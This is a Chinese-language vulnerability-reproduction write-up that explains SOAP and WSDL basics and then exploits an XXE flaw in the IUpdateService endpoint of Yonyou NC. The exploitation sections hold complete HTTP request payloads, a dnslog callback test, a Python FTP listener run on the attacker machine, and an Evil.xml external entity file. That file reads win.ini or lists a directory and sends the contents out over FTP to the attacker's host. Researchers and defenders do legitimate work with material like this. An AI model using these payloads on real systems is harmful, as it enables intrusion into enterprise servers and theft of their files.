# IUpdateService-XXE
# 0x00 前置知识
接口测试分为 `web service` 接口测试、 `API` 接口测试、`WebSocket` 接口测试等。用友NC中的 `IUpdateService XXE` 漏洞属于 `web service` 接口测试。

## 0.1 web service 接口测试
`Web Service` 简介：`Web Service` 是一个平台独立的、低耦合的、自包含的、基于可编程的Web的应用程序，可使用开放的XML（标准通用标记语言下的一个子集）标准来描述、发布、发现、协调和配置这些应用程序，用于开发分布式的交互操作的应用程序。

一般情况下，`Web Service` 分为 2 种类型：
- `SOAP` 型 `Web Service` ：`SOAP` 型 `Web Service` 允许使用 `XML` 格式与服务器进行通信；
- `REST` 型 `Web Service` ：`REST` 型 `Web Service` 允许使用 `JSON` 格式（也可以使用 `XML` 格式）与服务器进行通信。与 `HTTP` 类似，该类型服务支持 `GET`、`POST`、`PUT`、`DELETE` 方法。不需要 `WSDL`、`UDDI`；

`Web Service` 三要素：
- `SOAP（Simple Object Access Protocol）`
- `WSDL（WebServicesDescriptionLanguage）`
- `UDDI（UniversalDescriptionDiscovery andIntegration）`

其中， `SOAP` 用来描述传递信息的格式， `WSDL` 用来描述如何访问具体的接口， `UDDI` 用来管理、分发、查询 `Web Service` 。

其中， `WSDL（Web Services Description Language）` 即网络服务描述语言，用于描述 `Web` 服务的公共接口。这是一个基于 `XML` 的关于如何与 `Web` 服务通讯和使用的服务描述；也就是描述与目录中列出的 `Web` 服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。`WSDL` 给出了 `SOAP` 型 `Web Service` 的基本定义，`WSDL` 基于 `XML` 语言，描述了与服务交互的基本元素，说明服务端接口、方法、参数和返回值， `WSDL` 是随服务发布成功，自动生成，无需编写。少数情况下，`WSDL` 也可以用来描述 `REST` 型 `Web Service` 。 `SOAP` 也是基于 `XML` （标准通用标记语言下的一个子集）和 `XSD` 的，`XML` 是 `SOAP` 的数据编码方式。

带有 `wsdl` 标志的 `URL` 连接就是 `SOAP` 型 `web service` 接口，比如用友的 `IUpdateService` 接口。

```bash
http://ip:port/uapws/service/nc.uap.oba.update.IUpdateService?wsdl
```

<img width="1440" alt="image" src="https://user-images.githubusercontent.com/84888757/223007169-ae96f176-873a-4471-b787-a06b21b0c8d2.png">


我们可以使用 `SoapUI` 接口工具进行测试。


# 0x01 漏洞信息
```bash
# 物理路径
NC65_Server_home/temp/wsgen/nc/uap/oba/update/IUpdateService.wsdl

# 漏洞路由
/uapws/service/nc.uap.oba.update.IUpdateService?wsdl
```

# 0x02 漏洞利用
## 2.1 `SoapUI` 构造验证数据包
- 参考链接：SoapUI 简介和入门实例解析

填入工程名和 `WSDL` 地址，`WSDL` 地址为：
```
http://192.168.50.13:8888/uapws/service/nc.uap.oba.update.IUpdateService?wsdl
```

<div align=center ><img width="800" src="https://user-images.githubusercontent.com/84888757/223004162-1516ef06-d0e5-44df-a99f-e0eb589e3983.png" /></div>



点击OK后就已经创建好一个工程了，`SoapUI` 工具会自动解析 `WSDL` 里面接口名和接口请求信息。

然后我们就可以对接口进行测试，需要双击接口请求信息：`Request1`，这时候会看到该接口的请求报文信息。

在此处需要注意的是：接口 `getResult` 的请求中 `?` 表示为我们需要测试的参数，如下图所示：

![image](https://user-images.githubusercontent.com/84888757/223006567-6a7ad593-d316-4a7a-b82d-9becf10186fb.png)

我们直接在这里发送请求看一下：

![image](https://user-images.githubusercontent.com/84888757/223006579-32d6ed3a-8b9f-43fc-a8c6-c1d256f8e384.png)

在 `SOAPUI` 挂上burp代理：

![image](https://user-images.githubusercontent.com/84888757/223006596-014750d4-4ddf-4d02-9793-4848669bba44.png)

使用burp发送数据包：

```
POST http://192.168.50.13:8888/uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:getResult"
Content-Length: 327
Host: 192.168.50.13:8888
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
   <soapenv:Header/>
   <soapenv:Body>
      <iup:getResult>
         <!--Optional:-->
         <iup:string>gero et</iup:string>
      </iup:getResult>
   </soapenv:Body>
</soapenv:Envelope>
```

![image](https://user-images.githubusercontent.com/84888757/223006687-ab55fcca-03dc-4f3f-b509-5e98b13c53e6.png)

## 2.2 burp插件Wsdler构造验证数据包
有可以替代 `SOAPUI` 的burp插件 `Wsdler` ，在 `Extender` -> `BApp Store` 即可下载。

访问 `wsdl` 接口，然后转发到 `Wsdler` 中。

![image](https://user-images.githubusercontent.com/84888757/223066758-13620359-6c99-4f7b-9758-dc2ed50c15b2.png)

到插件 `Wsdler` 里去查看，再转发到 `Repeater` 中进行发送。

![image](https://user-images.githubusercontent.com/84888757/223066816-ca74087d-7fa3-47ce-9fd0-91efab34fda7.png)

![image](https://user-images.githubusercontent.com/84888757/223066851-c640e9b8-f411-49b0-9095-7d05847da874.png)



## 2.3 dnslog验证
我们替换为 `xxe` 的 `payload`，用 `dnslog` 证明一下
```
POST http://192.168.50.13:8888/uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:getResult"
Content-Length: 416
Host: 192.168.50.13:8888
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
   <soapenv:Header/>
   <soapenv:Body>
      <iup:getResult>
         <!--Optional:-->
         <iup:string><![CDATA[
<!DOCTYPE foo [<!ENTITY % aaa SYSTEM "http://666.04bx1e.dnslog.cn">%aaa;]>
<xxx/>]]></iup:string>
      </iup:getResult>
   </soapenv:Body>
</soapenv:Envelope>
```

注意第一个 `% aaa` 的 `%` 和 `aaa` 之间是有空格的。

![image](https://user-images.githubusercontent.com/84888757/223006841-817a9b7e-c512-4ba5-8239-17702459e49f.png)



<div align=center ><img width="700" src="https://user-images.githubusercontent.com/84888757/223006871-2b35b2e5-4019-412f-a7c9-512777ade7bc.png" /></div>

## 2.4 文件读取利用
### 2.4.1 攻击机起一个FTP服务器
```bash
python3 FtpServer.py
```

这里是为了之后接收 `xxe` 打回来的服务器文件信息。

```python
import os
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

def main():
    # 实例化虚拟用户, 这是FTP验证的首要条件
    authorizer = DummyAuthorizer()
    # Define a new user having full r/w permissions and a read-only
    # 添加用户权限和路径, 括号内的参数为(用户名, 密码, 用户目录, 权限)
    # authorizer.add_user('user', '12345', '.', perm='elradfmwMT')

    # anonymous user , 只需要路径, 指定当前路径
    authorizer.add_anonymous('.')

    # 初始化 FTP handler class
    handler = FTPHandler
    handler.authorizer = authorizer

    # Define a customized banner (string returned when client connects)
    handler.banner = "pyftpdlib based ftpd ready."

    # 监听ip和port
    # Instantiate FTP server class and listen on 0.0.0.0:2121
    address = ('0.0.0.0', 2121)
    server = FTPServer(address, handler)
    # set a limit for connections
    # server.max_cons = 256
    # server.max_cons_per_ip = 5

    # start ftp server
    server.serve_forever()

if __name__ == '__main__':
    main()
```

<div align=center ><img width="800" src="https://user-images.githubusercontent.com/84888757/223007526-377dc534-07e6-4368-b1bb-363ceff52b2d.png" /></div>

### 2.4.2 攻击机开启一个http服务
```bash
python3 -m http.server 9999
```

这里放一个 `Evil.xml` ，用来放外部文件供漏洞处读取。
意思就是读取 `win.ini` 文件，并返回到 `FTP` 服务

📒 Evil.xml
```xml
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://192.168.50.100:2121/%file;'>">
%int;
%send;
```

<div align=center ><img width="600" src="https://user-images.githubusercontent.com/84888757/223007831-d55bdf34-2cca-4527-8457-95417165bc05.png" /></div>


### 2.4.3 构造 `poc` 去加载 `Evil.xml` 文件
```
POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:getResult"
Content-Length: 442
Host: 192.168.50.13:8888
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
   <soapenv:Header/>
   <soapenv:Body>
      <iup:getResult>
         <!--Optional:-->
         <iup:string><![CDATA[
<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://192.168.50.100:9999/Evil.xml">%aaa;%ccc;%ddd;]>
<xxx/>]]></iup:string>
      </iup:getResult>
   </soapenv:Body>
</soapenv:Envelope>
```

![image](https://user-images.githubusercontent.com/84888757/223010863-ae921670-d9a7-4829-9501-c456b05f943e.png)


### 2.4.4 查看FTP服务监听

![image](https://user-images.githubusercontent.com/84888757/223008020-11f51491-d8b8-4e2e-88ba-02d0808e29b1.png)

如果要查看目录，修改 `Evil.xml` 即可。

📒 Evil.xml
```xml
<!-- <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini"> -->
<!ENTITY % file SYSTEM "file:///C:/yonyou/home/">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://192.168.50.100:2121/%file;'>">
%int;
%send;
```
![image](https://user-images.githubusercontent.com/84888757/223008109-8ac82fd3-57d0-4003-8f7d-d866ff381bd8.png)

# 0x03 参考链接
- [用友NC系统XXE挖掘，读取系统文件](https://zone.huoxian.cn/d/201-ncxxe)
- [常见API接口渗透测试流程](https://mp.weixin.qq.com/s/82msGn0JOPEMsjSJLFkr8Q)



